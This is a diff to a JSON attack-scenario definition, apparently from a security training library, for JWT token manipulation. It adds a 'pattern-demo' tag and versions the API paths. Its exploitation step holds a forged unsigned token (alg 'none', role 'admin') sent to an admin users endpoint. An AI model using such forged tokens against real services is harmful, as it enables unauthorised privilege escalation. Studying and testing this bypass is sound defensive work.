@@ -1,6 +1,7 @@
 {
   "id": "jwt-token-manipulation",
   "name": "JWT Token Manipulation",
+  "kind": "pattern-demo",
   "category": "Authentication Attacks",
   "difficulty": "Advanced",
   "description": "JWT token manipulation and forgery attacks including algorithm confusion, signature bypasses, and privilege escalation",
@@ -11,7 +12,7 @@
       "stage": "reconnaissance",
       "request": {
         "method": "POST",
-        "url": "/api/auth/login",
+        "url": "/api/v1/auth/login",
         "headers": {
           "Content-Type": "application/json"
         },
@@ -48,7 +49,7 @@
       "stage": "exploitation",
       "request": {
         "method": "GET",
-        "url": "/api/admin/users",
+        "url": "/api/v1/admin/users",
         "headers": {
           "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
         }
